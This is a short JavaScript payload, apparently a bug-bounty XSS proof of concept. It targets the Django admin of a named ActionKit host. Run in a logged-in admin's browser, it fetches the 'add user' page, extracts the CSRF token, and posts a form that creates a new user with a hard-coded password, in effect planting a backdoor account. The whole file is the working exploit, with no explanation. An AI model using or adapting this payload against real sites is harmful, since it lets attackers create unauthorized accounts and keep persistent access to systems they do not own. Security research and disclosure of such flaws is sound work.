// First, send the GET request
fetch('https://insight.actionkit.com/admin/auth/user/add/', {
  method: 'GET',
  credentials: 'include'
})
  .then(response => response.text())  // Process the GET response as text (HTML)
  .then(data => {
    console.log("GET response:", data); // Debugging output
    
    // Parse the HTML to extract the csrfmiddlewaretoken
    const parser = new DOMParser();
    const doc = parser.parseFromString(data, 'text/html');
    const csrfToken = doc.querySelector('input[name="csrfmiddlewaretoken"]').value;
    console.log("Extracted CSRF Token:", csrfToken);  // Debugging output
    
    // Then send the POST request with the CSRF token in the body
    return fetch('https://insight.actionkit.com/admin/auth/user/add/', {
      method: 'POST',
      credentials: 'include',
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: `csrfmiddlewaretoken=${encodeURIComponent(csrfToken)}&email=trey%2Bxss%40inspectiv.com&username=Trey_xss&password1=nLCw4SDzV%26IQtn%25e&password2=nLCw4SDzV%26IQtn%25e&_save=Save`
    });
  })
  .then(response => response.text())  // Process POST response
  .then(data => {
    console.log("POST response:", data);  // Debugging output
  })
  .catch(err => {
    console.error("Error:", err);  // Catch any errors
  });

